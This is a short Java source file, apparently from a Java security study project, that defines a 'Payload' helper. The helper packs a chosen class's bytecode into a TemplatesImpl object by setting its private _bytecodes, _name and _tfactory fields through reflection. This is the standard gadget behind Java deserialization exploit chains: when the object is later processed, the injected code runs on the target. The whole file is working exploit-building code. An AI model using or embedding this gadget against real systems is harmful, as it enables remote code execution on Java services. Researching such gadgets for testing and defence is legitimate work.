package com.pacemrc.javasec.Gadgets;

import com.pacemrc.javasec.tools.ysoserial.Reflections;
import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;

public class Payload {

    public static TemplatesImpl getTemplatesImpl(Class<?> cls) throws Exception {

        JavaClass javaClass = Repository.lookupClass(cls);
        byte[] bytes = javaClass.getBytes();
        com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl templates = new com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl();
        Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{bytes});
        Reflections.setFieldValue(templates, "_name", "anystr");
        Reflections.setFieldValue(templates, "_tfactory", new com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl());

        return templates;
    }
}
